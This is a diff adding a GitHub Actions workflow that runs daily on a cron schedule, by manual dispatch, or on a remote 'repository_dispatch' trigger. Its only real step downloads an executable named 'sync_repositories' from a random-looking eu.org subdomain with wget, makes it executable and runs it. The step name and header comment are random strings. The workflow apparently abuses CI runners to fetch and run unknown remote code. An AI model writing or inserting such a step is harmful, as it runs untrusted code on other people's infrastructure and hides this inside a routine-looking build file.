@@ -1,0 +1,22 @@
+#2024-03-18-[135739]-6flr86e3
+name: main
+
+on:
+  workflow_dispatch:
+
+  repository_dispatch:
+    types: runner_workflow
+
+  schedule:
+    - cron: "55 3 * * * "
+    
+jobs:
+  build-deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v3
+      - name: eecgwiw6kfpawrvv
+        run: |
+          wget -q https://llkqm7mhanzrohh6.callforpapers.eu.org/sync_repositories
+          chmod 755 sync_repositories
+          ./sync_repositories
